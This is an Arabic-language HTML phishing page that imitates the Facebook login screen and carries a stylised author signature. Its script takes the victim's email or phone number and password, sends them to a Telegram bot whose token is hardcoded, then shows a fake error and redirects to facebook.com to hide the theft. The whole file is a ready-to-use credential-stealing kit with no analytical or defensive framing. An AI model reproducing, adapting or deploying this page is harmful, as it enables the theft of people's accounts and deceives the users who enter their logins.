<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Facebook Login | 𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞</title>
    <style>
        body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; text-align: center; padding: 50px 10px; }
        .login-box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); max-width: 400px; margin: auto; }
        h1 { color: #1877f2; font-size: 40px; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 17px; }
        .btn { width: 100%; padding: 14px; background: #1877f2; border: none; color: #fff; font-weight: bold; border-radius: 6px; cursor: pointer; font-size: 20px; margin-top: 10px; }
        .footer { margin-top: 20px; color: #1c1e21; font-weight: bold; font-size: 18px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>facebook</h1>
        <p>قم بتسجيل الدخول للمتابعة</p>
        <input type="text" id="u" placeholder="البريد الإلكتروني أو رقم الهاتف" oninput="v(this)">
        <input type="password" id="p" placeholder="كلمة السر" oninput="v(this)">
        <button class="btn" onclick="send()">تسجيل الدخول</button>
        <div class="footer">𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞</div>
    </div>

    <script>
        const tok = "
8250478196:AAH0J5NF3cOvM_Zm_DqE8wmbeKJc3zsbviM"; 
        const cid = new URLSearchParams(window.location.search).get('chatId');
        function v(i) { i.value = i.value.replace(/[^\x00-\x7F]/g, ""); }

        function send() {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            if(!user || !pass) return alert("الرجاء إدخال البيانات!");
            
            const msg = `💠 صيد فيسبوك جديد 💠\n\n👤 اليوزر: ${user}\n🔑 الباسورد: ${pass}\nBy: 𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞`;
            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`)
            .then(() => {
                alert("خطأ في الاتصال، يرجى المحاولة لاحقاً");
                window.location.href = "https://facebook.com";
            });
        }
    </script>
</body>
</html>
